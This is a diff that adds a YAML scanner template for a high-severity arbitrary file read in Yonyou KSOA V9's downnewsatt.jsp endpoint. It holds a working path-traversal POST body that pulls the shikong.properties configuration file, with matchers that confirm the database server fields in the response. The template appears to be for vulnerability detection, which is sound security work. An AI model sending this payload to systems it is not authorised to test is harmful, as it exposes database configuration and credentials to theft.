@@ -1,0 +1,23 @@
+id: yongyou-ksoav9-downnewsatt-readfile
+info:
+  name: 用友 KSOA V9 downnewsatt 接口 - 任意文件读取漏洞
+  author: Chaitin
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: yonyou
+    product: ksoav9
+  tags: file-read,vuln,yonyou,ksoav9
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/newspublish/downnewsatt.jsp'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: exclusivenm=../../WEB-INF/classes/shikong.properties
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, ''skmaster'') && contains(body, ''dbserver'')'
